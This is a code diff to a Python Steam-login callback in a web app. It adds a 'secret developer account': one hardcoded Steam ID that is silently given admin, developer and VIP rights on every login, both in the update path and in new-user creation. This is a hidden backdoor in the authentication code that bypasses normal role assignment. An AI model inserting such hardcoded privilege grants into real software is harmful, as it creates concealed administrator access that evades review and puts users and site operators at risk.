@@ -195,15 +195,25 @@ async def steam_callback(request: Request):
             # Check if user exists in DB
             existing_user = await db.users.find_one({"steam_id": steam_id}, {"_id": 0})
             
+            # Secret developer account
+            is_owner = steam_id == "76561198984628949"
+            
             if existing_user:
                 # Update profile info
+                update_data = {
+                    "username": player.get("personaname", "Unknown"),
+                    "avatar_url": player.get("avatarfull"),
+                    "profile_url": player.get("profileurl"),
+                }
+                # Auto-grant developer to owner
+                if is_owner:
+                    update_data["is_developer"] = True
+                    update_data["is_admin"] = True
+                    update_data["is_vip"] = True
+                
                 await db.users.update_one(
                     {"steam_id": steam_id},
-                    {"$set": {
-                        "username": player.get("personaname", "Unknown"),
-                        "avatar_url": player.get("avatarfull"),
-                        "profile_url": player.get("profileurl"),
-                    }}
+                    {"$set": update_data}
                 )
                 user_data = await db.users.find_one({"steam_id": steam_id}, {"_id": 0})
             else:
@@ -213,9 +223,9 @@ async def steam_callback(request: Request):
                     username=player.get("personaname", "Unknown"),
                     avatar_url=player.get("avatarfull"),
                     profile_url=player.get("profileurl"),
-                    is_admin=False,
-                    is_vip=False,
-                    is_developer=False
+                    is_admin=is_owner,
+                    is_vip=is_owner,
+                    is_developer=is_owner
                 )
                 user_dict = user.model_dump()
                 user_dict['created_at'] = user_dict['created_at'].isoformat()
